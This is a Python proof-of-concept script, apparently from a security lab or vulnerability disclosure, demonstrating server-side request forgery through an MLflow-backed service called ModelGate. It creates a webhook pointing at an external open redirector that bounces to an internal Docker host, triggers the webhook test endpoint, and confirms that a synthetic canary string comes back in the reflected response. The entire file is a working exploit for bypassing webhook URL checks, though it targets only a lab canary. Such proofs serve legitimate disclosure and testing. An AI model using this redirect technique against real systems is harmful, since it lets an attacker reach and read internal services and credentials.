"""Safe SSRF proof: read a synthetic Docker-internal canary through MLflow."""

from __future__ import annotations

import json
import os
from urllib.parse import urlencode

import httpx

CANARY_VALUE = "MODELGATE_INTERNAL_SSRF_PROOF"


def main() -> None:
    modelgate_url = os.getenv("POC_MODELGATE_URL", "http://api:8080").rstrip("/")
    redirector = os.getenv(
        "POC_REDIRECTOR_URL", "https://httpbin.org/redirect-to"
    )
    internal_target = "http://lab-canary:9000/canary"
    first_hop = f"{redirector}?{urlencode({'url': internal_target, 'status_code': 302})}"

    with httpx.Client(timeout=45.0) as client:
        create = client.post(
            f"{modelgate_url}/api/webhooks",
            json={
                "name": "ssrf-canary-proof",
                "url": first_hop,
                "events": [{"entity": "REGISTERED_MODEL", "action": "CREATED"}],
                "description": "Synthetic internal canary SSRF verification",
            },
        )
        create.raise_for_status()
        webhook_id = create.json()["webhook"]["webhook_id"]

        test = client.post(
            f"{modelgate_url}/api/webhooks/{webhook_id}/test",
            json={"event": {"entity": "REGISTERED_MODEL", "action": "CREATED"}},
        )
        test.raise_for_status()
        result = test.json()

    serialized = json.dumps(result, ensure_ascii=False)
    if CANARY_VALUE not in serialized:
        raise RuntimeError(
            "SSRF proof failed: the reflected MLflow response did not contain the canary"
        )

    print(
        json.dumps(
            {
                "proof": "ssrf",
                "success": True,
                "first_hop": first_hop,
                "internal_target": internal_target,
                "webhook_id": webhook_id,
                "canary": CANARY_VALUE,
            },
            ensure_ascii=False,
        )
    )


if __name__ == "__main__":
    main()
